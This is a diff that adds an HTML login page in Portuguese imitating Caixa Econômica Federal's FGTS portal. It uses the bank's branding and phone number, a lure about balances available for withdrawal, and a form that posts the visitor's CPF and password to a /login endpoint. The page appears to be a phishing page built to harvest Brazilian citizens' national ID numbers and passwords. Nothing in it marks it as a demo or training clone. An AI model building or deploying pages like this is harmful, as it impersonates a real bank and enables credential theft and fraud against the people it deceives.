@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login FGTS - Caixa Econômica Federal</title>
+    <link rel="stylesheet" href="style.css">
+    
+</head>
+<body>
+    
+    <div class="header">
+        <img src="images/bannerheader_fgts.png" alt="Caixa Econômica Federal" class="logo">       
+    </div>
+    
+    <div class="container">
+        <h1>ACESSE SUA CONTA FGTS</h1>
+        
+        <div class="alert">
+            <h2>📢 Consulte o saldo disponível para resgate!</h2>
+        </div>        
+       
+        <form action="/login" method="POST">
+            <div class="form-group">
+                <label for="cpf">CPF</label>
+                <input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF">
+            </div>
+            
+            <div class="form-group">
+                <label for="senha">Senha</label>
+                <input type="password" id="senha" name="senha" placeholder="Digite sua senha">
+            </div>
+            <button type="submit" class="btn">ACESSAR MINHA CONTA FGTS</button>
+        </form>
+             
+        <div class="footer">
+            <p>Não tem cadastro? <a href="#">Cadastre-se aqui</a></p>
+            <p>Esqueceu sua senha? <a href="#">Recuperar senha</a></p>
+            <p>Dúvidas? Acesse nosso <a href="#">FAQ</a> ou ligue 0800 726 0101</p>
+        </div>
+    </div>
+    
+    <div style="max-width: 500px; margin: 20px auto; padding: 15px; background-color: white; border-radius: 5px;">
+        <h3 style="color: #00468b; text-align: center;">📌 Você sabia?</h3>
+        <p>Além do saque tradicional, seu FGTS pode ser usado para:</p>
+        <ul>
+            <li>Financiamento da Casa Própria (Minha Casa Minha Vida)</li>
+            <li>Pagamento de dívidas em bancos conveniados</li>
+            <li>Emergências financeiras</li>
+        </ul>
+        
+        
+    </div>
+</body>
+</html>
